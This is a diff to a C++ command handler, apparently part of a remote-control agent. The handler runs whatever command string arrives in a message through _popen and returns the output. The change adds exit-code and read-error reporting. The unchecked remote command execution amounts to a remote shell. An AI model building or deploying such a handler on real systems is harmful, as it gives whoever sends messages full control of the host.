@@ -41,11 +41,13 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 
 	std::string command = byte2string(msg.data_).c_str();
 	std::string result;
+	bool commandFailed = false;
 
 	// EASIEST METHOD - just use _popen directly
 	FILE* pipe = _popen(command.c_str(), "r");
 	if (!pipe)
 	{
+		commandFailed = true;
 		result = "ERROR: Failed to execute command";
 	}
 	else
@@ -55,7 +57,19 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 		{
 			result += buffer;
 		}
-		_pclose(pipe);
+		if (ferror(pipe))
+		{
+			commandFailed = true;
+			result += "\nERROR: Failed to read command output";
+		}
+		const int exitCode = _pclose(pipe);
+		if (exitCode != 0)
+		{
+			commandFailed = true;
+			result += exitCode == -1
+				? "\nERROR: Failed to retrieve command exit status"
+				: "\nERROR: Command exited with code " + std::to_string(exitCode);
+		}
 	}
 
 	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
@@ -64,7 +78,7 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 	outMsg.data_ = string2byte(result);
 
 	MessageHeader header;
-	header.messageType_ = MessageType::COMMAND_RESULT;
+	header.messageType_ = commandFailed ? MessageType::ERROR_REPORT : MessageType::COMMAND_RESULT;
 	header.messageId_ = 105; // TODO: use input messageId?
 	header.dataSize_ = outMsg.data_.size();
 	outMsg.header_ = header;
